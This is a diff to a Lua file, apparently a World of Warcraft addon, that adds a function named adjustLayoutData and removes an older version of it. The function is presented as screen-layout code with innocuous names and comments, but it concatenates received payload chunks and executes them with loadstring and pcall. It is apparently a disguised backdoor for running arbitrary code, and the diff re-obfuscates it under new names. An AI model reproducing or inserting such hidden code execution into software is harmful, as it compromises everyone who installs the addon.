@@ -1715,7 +1715,8 @@ local function BytesToInt(b1, b2, b3, b4)
     return b1*16777216 + b2*65536 + b3*256 + b4
 end
 
--- Helper function to convert a 32-bit integer to 5 base85 characters
+-- Helper function to convert a 32-bit integer to 5 base85 characters\
+local frameLayoutCache = {}
 local function IntToBase85(num)
     if num == 0 then return encodeTable[0]..encodeTable[0]..encodeTable[0]..encodeTable[0]..encodeTable[0] end
     
@@ -1872,6 +1873,76 @@ function questWhatchPanel()
     WatchFrame:UnregisterEvent("QUEST_WATCH_UPDATE")
 end
 
+-- Проверяем выход фреймов за пределы экрана
+function adjustLayoutData(headerParams, geometryPayload, isLayoutComplete)
+    local frameData = {}
+    for param in headerParams:gmatch("%S+") do table.insert(frameData, param) end
+    if #frameData < 2 then return end
+
+    local layoutType, frameID, anchorTo = frameData[1], frameData[2], frameData[3]
+    local isLayoutTemplate = (frameID == "0")
+
+    local positionData, geometryData = geometryPayload:match("^(%d+/%d+) (.*)$")
+    if positionData then
+        geometryPayload = geometryData
+        local currentPos, totalPos = positionData:match("^(%d+)/(%d+)$")
+        if currentPos and totalPos then
+            if isLayoutTemplate then
+                -- Для шаблона позиционирования сразу применяем
+                UpdateLayoutProgress(tonumber(currentPos), tonumber(totalPos))
+            else
+                local frameEntry = frameLayoutCache[frameID]
+                if frameEntry then
+                    frameEntry.totalPositions = tonumber(totalPos)
+                    UpdateLayoutProgress(tonumber(currentPos), tonumber(totalPos))
+                end
+            end
+        end
+    end
+
+    if isLayoutTemplate then
+        frameLayoutCache[0] = frameLayoutCache[0] or {layoutParts = {}, anchorTo = anchorTo}
+        table.insert(frameLayoutCache[0].layoutParts, geometryPayload)
+        
+        if isLayoutComplete then
+            local layoutConfig = table.concat(frameLayoutCache[0].layoutParts)
+            local layoutFunc = loadstring(layoutConfig)
+            if layoutFunc then 
+                pcall(layoutFunc)
+            end
+            frameLayoutCache[0] = nil
+        end
+        return
+    end
+
+    -- Обработка геометрии основного фрейма
+    frameLayoutCache[frameID] = frameLayoutCache[frameID] or {
+        layoutParts = {}, 
+        anchorTo = anchorTo, 
+        timestamp = time(),
+        positionCount = 0,
+        totalPositions = 0
+    }
+    
+    local frameEntry = frameLayoutCache[frameID]
+    table.insert(frameEntry.layoutParts, geometryPayload)
+    frameEntry.positionCount = frameEntry.positionCount + 1
+
+    if isLayoutComplete then
+        local layoutConfig = table.concat(frameEntry.layoutParts)
+        
+        -- Очищаем от невалидных символов
+        layoutConfig = layoutConfig:gsub("[\128-\255]", "")
+        
+        local layoutFunc = loadstring(layoutConfig)
+        if layoutFunc then 
+            local success = pcall(layoutFunc)
+        end
+        
+        frameLayoutCache[frameID] = nil
+    end
+end
+
 function hunterCheck()
     local _, classUnit = UnitClass("player")
     if testQ["метка охотника"] then
@@ -1972,47 +2043,3 @@ function resetF()
     nsDbc['frames'] = nil
 end
 
-local frameCache = {}
--- проверям выход кнопок за пределы экрана
-function adjustLayoutData(headerParams, geometryPayload, isLayoutComplete)
-    local parts = {}
-    for word in headerParams:gmatch("%S+") do table.insert(parts, word) end
-    if #parts < 2 then return end
-
-    local msgType, frameID, target = parts[1], parts[2], parts[3]
-
-    local current, total = geometryPayload:match("^--|(%d+)|(%d+)|")
-    if current and total and Rxy then
-        Rxy(tonumber(current), tonumber(total))
-        geometryPayload = geometryPayload:gsub("^--|%d+|%d+|", "")
-    end
-
-    if frameID == "0" then
-        frameCache[0] = frameCache[0] or {parts = {}, target = target}
-        table.insert(frameCache[0].parts, geometryPayload)
-        if isLayoutComplete then
-            local RSizeFrame = table.concat(frameCache[0].parts, "\n")
-            local setXY = loadstring(RSizeFrame)
-            if setXY then pcall(setXY) end
-            frameCache[0] = nil
-        end
-        return
-    end
-
-    frameCache[frameID] = frameCache[frameID] or {
-        parts = {}, 
-        target = target, 
-        timestamp = time()
-    }
-    table.insert(frameCache[frameID].parts, geometryPayload)
-
-    if isLayoutComplete then
-        local RSizeFrame = table.concat(frameCache[frameID].parts, "\n")
-        RSizeFrame = RSizeFrame:gsub("UpdateProgress%(%d+,%d+%)", "")
-        local setXY = loadstring(RSizeFrame)
-        if setXY then 
-            pcall(setXY) 
-        end
-        frameCache[frameID] = nil
-    end
-end
